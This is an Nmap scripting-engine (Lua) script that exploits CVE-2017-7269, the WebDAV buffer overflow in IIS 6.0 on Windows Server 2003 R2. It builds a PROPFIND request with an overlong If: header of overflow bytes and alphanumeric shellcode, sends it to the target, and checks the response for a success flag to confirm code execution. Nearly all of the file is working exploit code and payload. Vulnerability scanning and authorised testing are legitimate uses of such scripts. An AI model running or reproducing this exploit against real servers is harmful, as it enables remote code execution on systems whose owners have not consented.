local nmap = require "nmap"
local string = require "string"
local shortport = require "shortport"
local vulns = require "vulns"

-- NSE Buffer Overflow vulnerability in IIS

---
-- @usage
-- ./nmap --script iis-buffer-overflow.nse -sV <target>
--
-- @output
-- PORT   STATE  SERVICE
-- 80/tcp open   http
-- |  iis-buffer-overflow:
-- |    VULNERABLE: Buffer Overflow in IIS 6 and Windows Server 2003 R2
-- |       State: LIKELY_VULNERABLE
-- |       Risk factor: High CVSS: 10.0
-- |       Description:
-- |         Buffer overflow in the ScStoragePathFromUrl function in the WebDAV
-- |         service in Internet Information Services (IIS) 6.0
-- |         in Microsoft Windows Server 2003 R2 allows remote attackers to execute
-- |         arbitrary code via a long header beginning with "If: <http://" in a
-- |         PROPFIND request, as exploited in the wild in July or August 2016.
-- |
-- |         Original exploit by Zhiniang Peng and Chen Wu.
-- |
-- |    References:
-- |     https://github.com/edwardz246003/IIS_exploit,
-- |     https://github.com/lcatro/CVE-2017-7269-Echo-PoC,
-- |_    https://0patch.blogspot.in/2017/03/0patching-immortal-cve-2017-7269.html
--

author = {
  "Zhiniang Peng",       -- Original author
  "Chen Wu",             -- Original author
  "LCatro",              -- Exploit author
  "Rewanth Cool",        -- NSE script author
  "Samy Kacimi",         -- NSE script contributor
  "Maxime Alay-Eddine"   -- NSE script contributor
}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "vuln", "intrusive"}

portrule = shortport.http

action = function(host, port)
  local socket, response, try, catch, payload, shellcode

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln = {
    title = 'Buffer Overflow in IIS 6 and Windows Server 2003 R2',
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0
in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning
with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.

Original exploit by Zhiniang Peng and Chen Wu.
    ]],
    IDS = {
      CVE = 'CVE-2017-7269'
    },
    scores = {
      CVSS = '10.0'
    },
    references = {
      'https://github.com/edwardz246003/IIS_exploit',
      'https://0patch.blogspot.in/2017/03/0patching-immortal-cve-2017-7269.html'
    },
    dates = {
      disclosure = {year = '2017', month = '03', day = '26'},
    }
  }

  socket = nmap.new_socket("tcp")
  socket:set_timeout(10000)
  catch = function()
    socket:close()
  end

  try = nmap.new_try(catch)
  try(socket:connect(host, port, "tcp"))

  -- Crafting the payload by parts

  -- Crafting the request with HTTP PROPFIND method
  payload = 'PROPFIND / HTTP/1.1\r\nHost: localhost:' .. port.number .. '\r\nContent-Length: 0\r\n'
  payload = payload .. 'If: <http://localhost:' .. port.number .. '/aaaaaaa'

  -- Random text added to payload (Can be modified only for experimental purposes)
  payload = payload .. '\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd'
  payload = payload .. '\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5'
  payload = payload .. '\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91'
  payload = payload .. '\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80'
  payload = payload .. '\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3'
  payload = payload .. '\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4'
  payload = payload .. '\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88'
  payload = payload .. '\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7'
  payload = payload .. '\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab'
  payload = payload .. '\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80'
  payload = payload .. '\xb3\xe3\x95\xb7'

  -- Main payload (Do not edit this part)
  payload = payload .. '\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6'
  payload = payload .. '\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88'
  payload = payload .. '\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5'
  payload = payload .. '\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83'
  payload = payload .. '\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d'
  payload = payload .. '\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7'
  payload = payload .. '\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'

  payload = payload .. '>'
  payload = payload .. ' (Not <locktoken:write1>) <http://localhost:' .. port.number .. '/bbbbbbb'

  -- Random text added to payload (Can be modified only for experimental purposes)
  payload = payload .. '\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6'
  payload = payload .. '\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5'
  payload = payload .. '\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7'
  payload = payload .. '\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5'
  payload = payload .. '\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5'
  payload = payload .. '\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4'
  payload = payload .. '\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6'
  payload = payload .. '\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7'
  payload = payload .. '\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3'
  payload = payload .. '\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5'

  -- Main payload (Do not edit this part)
  payload = payload .. '\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7'
  payload = payload .. '\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6'
  payload = payload .. '\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5'
  payload = payload .. '\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7'
  payload = payload .. '\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6'
  payload = payload .. '\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae'
  payload = payload .. '\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80'
  payload = payload .. '\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c'
  payload = payload .. '\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0'
  payload = payload .. '\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8'
  payload = payload .. '\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'

  -- Shellcode
  shellcode = 'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA'
  shellcode = shellcode .. 'BAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397N30WRJLMSSI7LNR72JPTK'
  shellcode = shellcode .. 'OXPZKQH0CR615NMNRP0NQNWNMOGP206NYKPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJOBN'
  shellcode = shellcode .. 'VO0LMLJLMKZ0HOXOY0TO0OS260ENMNRP0NQOGNMOGOB06OIMP2345RCS3RET3D3M0KLK8SRM0KPM0C0SYK5NQWP2DDK0PNP4KQBLLTKQBMDDKD2MXLOGG0'
  shellcode = shellcode .. 'JO6NQKO6LOLQQSLKRNLMP7QXOLMM18G9RJRR2R74KQBLP4K0JOL4K0LN1RXK3PHKQHQ0Q4K29MPM19CTKQ9MH9SOJQ94KNTTKKQJ6P1KOFLY1XOLMKQXGN'
  shellcode = shellcode .. 'X9PD5KFM33MKHOKSMO42UJDPXTKB8O4KQIC1V4KLL0K4K0XMLKQXSTKKTTKKQJ0CYQ4O4MTQKQK1QR90Z0QKOYPQOQOQJ4KLRJKTM1MWKOWMCBR2OQZKPP'
  shellcode = shellcode .. 'SKOYEKPA'

  payload = payload .. shellcode
  payload = payload .. '>\r\n\r\n'

  -- Exploiting the vulnerability
  try(socket:send(payload))

  -- We receive a 200 response if the payload succeeds.
  response = try(socket:receive_bytes(80960))
  socket:close()
  
  -- Checking for flag in the response
  local flag = 'HHIT CVE%-2017%-7269 Success'
  
  if string.match(response, flag) then
    vuln.state = vulns.STATE.EXPLOIT
    vuln.exploit_results = response
  end

  return vuln_report:make_output(vuln)

end
